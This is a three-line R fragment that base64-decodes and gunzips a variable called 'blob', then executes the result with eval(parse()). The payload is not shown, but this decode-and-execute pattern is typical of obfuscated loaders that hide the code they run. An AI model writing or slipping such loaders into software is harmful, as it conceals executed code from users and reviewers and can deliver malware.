packed <- base64enc::base64decode(blob)
code <- rawToChar(memDecompress(packed, 'gzip'))
eval(parse(text = code))
